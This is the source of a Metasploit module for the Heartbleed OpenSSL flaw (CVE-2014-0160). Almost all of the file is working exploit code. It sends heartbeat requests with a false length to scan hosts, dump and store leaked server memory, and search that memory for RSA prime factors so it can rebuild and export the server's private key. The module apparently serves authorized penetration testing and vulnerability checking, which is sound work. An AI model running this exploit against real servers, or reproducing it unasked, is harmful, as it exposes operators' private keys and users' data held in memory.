##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# TODO: Connection reuse: Only connect once and send subsequent heartbleed requests.
#   We tried it once in https://github.com/rapid7/metasploit-framework/pull/3300
#   but there were too many errors
# TODO: Parse the rest of the server responses and return a hash with the data
# TODO: Extract the relevant functions and include them in the framework

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Proto::SSL

  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
  SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)

  def initialize
    super(
      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',
      'Description'    => %q{
        This module implements the OpenSSL Heartbleed attack. The problem
        exists in the handling of heartbeat requests, where a fake length can
        be used to leak memory data in the response. Services that support
        STARTTLS may also be vulnerable.

        The module supports several actions, allowing for scanning, dumping of
        memory contents, and private key recovery.
      },
      'Author'         => [
        'Neel Mehta', # Vulnerability discovery
        'Riku', # Vulnerability discovery
        'Antti', # Vulnerability discovery
        'Matti', # Vulnerability discovery
        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
        'FiloSottile', # PoC site and tool
        'Christian Mehlmauer', # Msf module
        'wvu', # Msf module
        'juan vazquez', # Msf module
        'Sebastiano Di Paola', # Msf module
        'Tom Sellers', # Msf module
        'jjarmoc', #Msf module; keydump, refactoring..
        'Ben Buchanan', #Msf module
        'herself' #Msf module
      ],
      'References'     =>
        [
          ['CVE', '2014-0160'],
          ['US-CERT-VU', '720951'],
          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A'],
          ['URL', 'http://heartbleed.com/'],
          ['URL', 'https://github.com/FiloSottile/Heartbleed'],
          ['URL', 'https://gist.github.com/takeshixx/10107280'],
          ['URL', 'http://filippo.io/Heartbleed/']
        ],
      'DisclosureDate' => 'Apr 7 2014',
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
          ['DUMP',  {'Description' => 'Dump memory contents'}],
          ['KEYS',  {'Description' => 'Recover private keys from memory'}]
        ],
      'DefaultAction' => 'SCAN'
    )

    register_options(
      [
        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 50]),
        OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535])
      ], self.class)

  end

  def peer
    "#{rhost}:#{rport}"
  end

  #
  # Main methods
  #

  # Called when using check
  def check_host(ip)
    @check_only = true
    vprint_status "#{peer} - Checking for Heartbleed exposure"
    if bleed
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run
    if heartbeat_length > 65535 || heartbeat_length < 0
      print_error('HEARTBEAT_LENGTH should be a natural number less than 65536')
      return
    end

    if response_timeout < 0
      print_error('RESPONSE_TIMEOUT should be bigger than 0')
      return
    end

    super
  end

  # Main method
  def run_host(ip)
    # initial connect to get public key and stuff
    connect_result = establish_connect
    disconnect
    return if connect_result.nil?

    case action.name
      when 'SCAN'
        loot_and_report(bleed)
      when 'DUMP'
        loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
      when 'KEYS'
        getkeys
      else
        #Shouldn't get here, since Action is Enum
        print_error("Unknown Action: #{action.name}")
    end

    # ensure all connections are closed
    disconnect
  end

  #
  # DATASTORE values
  #

  # If this is merely a check, set to the RFC-defined
  # maximum padding length of 2^14. See:
  # https://tools.ietf.org/html/rfc6520#section-4
  # https://github.com/rapid7/metasploit-framework/pull/3252
  def heartbeat_length
    if @check_only
      SAFE_CHECK_MAX_RECORD_LENGTH
    else
      datastore['HEARTBEAT_LENGTH']
    end
  end

  def dumpfilter
    datastore['DUMPFILTER']
  end

  def max_keytries
    datastore['MAX_KEYTRIES']
  end

  def status_every
    datastore['STATUS_EVERY']
  end

  def tls_callback
    datastore['TLS_CALLBACK']
  end

  #
  # Helper Methods
  #

  # Get data from the socket
  # this ensures the requested length is read (if available)
  def get_data(length = -1)

    return sock.get_once(-1, response_timeout) if length == -1

    to_receive = length
    data = ''
    while to_receive > 0
      temp = sock.get_once(to_receive, response_timeout)
      break if temp.nil?

      data << temp
      to_receive -= temp.length
    end
    data
  end

  def to_hex_string(data)
    data.each_byte.map { |b| sprintf('%02X ', b) }.join.strip
  end

  # Generates, sends and receives a heartbeat message
  def bleed
    connect_result = establish_connect
    return if connect_result.nil?

    vprint_status("#{peer} - Sending Heartbeat...")
    sock.put(heartbeat_request(heartbeat_length))
    hdr = get_data(5)
    if hdr.nil? || hdr.empty?
      vprint_error("#{peer} - No Heartbeat response...")
      disconnect
      return
    end

    unpacked = hdr.unpack('Cnn')
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]

    # try to get the TLS error
    if type == RECORD_TYPE_ALERT
      res = get_data(len)
      alert_unp = res.unpack('CC')
      alert_level = alert_unp[0]
      alert_desc = alert_unp[1]

      # http://tools.ietf.org/html/rfc5246#section-7.2
      case alert_desc
      when 0x46
        msg = 'Protocol error. Looks like the chosen protocol is not supported.'
      else
        msg = 'Unknown error'
      end
      vprint_error("#{peer} - #{msg}")
      disconnect
      return
    end

    unless type == RECORD_TYPE_HEARTBEAT && version == tls_version
      vprint_error("#{peer} - Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
      disconnect
      return
    end

    heartbeat_data = get_data(heartbeat_length)
    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
    disconnect
    heartbeat_data
  end

  # Stores received data
  def loot_and_report(heartbeat_data)

    unless heartbeat_data
      vprint_error("#{peer} - Looks like there isn't leaked information...")
      return
    end

    print_good("#{peer} - Heartbeat response with leak")
    report_vuln({
      :host => rhost,
      :port => rport,
      :name => self.name,
      :refs => self.references,
      :info => "Module #{self.fullname} successfully leaked info"
    })

    if action.name == 'DUMP' # Check mode, dump if requested.
      pattern = dumpfilter
      if pattern
        match_data = heartbeat_data.scan(pattern).join
      else
        match_data = heartbeat_data
      end
      path = store_loot(
        'openssl.heartbleed.server',
        'application/octet-stream',
        rhost,
        match_data,
        nil,
        'OpenSSL Heartbleed server memory'
      )
      print_status("#{peer} - Heartbeat data stored in #{path}")
    end

    vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")

  end

  #
  # Keydumoing helper methods
  #

  # Tries to retreive the private key
  def getkeys
    print_status("#{peer} - Scanning for private keys")
    count = 0

    print_status("#{peer} - Getting public key constants...")
    n, e = get_ne

    if n.nil? || e.nil?
      print_error("#{peer} - Failed to get public key, aborting.")
    end

    vprint_status("#{peer} - n: #{n}")
    vprint_status("#{peer} - e: #{e}")
    print_status("#{peer} - #{Time.now.getutc} - Starting.")

    max_keytries.times {
      # Loop up to MAX_KEYTRIES times, looking for keys
      if count % status_every == 0
        print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
      end

      bleedresult = bleed
      return unless bleedresult

      p, q = get_factors(bleedresult, n) # Try to find factors in mem

      unless p.nil? || q.nil?
        key = key_from_pqe(p, q, e)
        print_good("#{peer} - #{Time.now.getutc} - Got the private key")

        print_status(key.export)
        path = store_loot(
          'openssl.heartbleed.server',
          'text/plain',
          rhost,
          key.export,
          nil,
          'OpenSSL Heartbleed Private Key'
        )
        print_status("#{peer} - Private key stored in #{path}")
        return
      end
      count += 1
    }
    print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.")
  end

  # Returns the N and E params from the public server certificate
  def get_ne
    unless @cert
      print_error("#{peer} - No certificate found")
      return
    end

    return @cert.public_key.params['n'], @cert.public_key.params['e']
  end

  # Tries to find pieces of the private key in the provided data
  def get_factors(data, n)
    # Walk through data looking for factors of n
    psize = n.num_bits / 8 / 2
    return if data.nil?

    (0..(data.length-psize)).each{ |x|
      # Try each offset of suitable length
      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)
      if can > 1 && can % 2 != 0 && can.num_bytes == psize
        # Only try candidates that have a chance...
        q, rem = n / can
        if rem == 0 && can != n
          vprint_good("#{peer} - Found factor at offset #{x.to_s(16)}")
          p = can
          return p, q
        end
      end
    }
    return nil, nil
  end

  # Generates the private key from the P, Q and E values
  def key_from_pqe(p, q, e)
    # Returns an RSA Private Key from Factors
    key = OpenSSL::PKey::RSA.new()

    key.p = p
    key.q = q

    key.n = key.p*key.q
    key.e = e

    phi = (key.p - 1) * (key.q - 1 )
    key.d = key.e.mod_inverse(phi)

    key.dmp1 = key.d % (key.p - 1)
    key.dmq1 = key.d % (key.q - 1)
    key.iqmp = key.q.mod_inverse(key.p)

    return key
  end

end
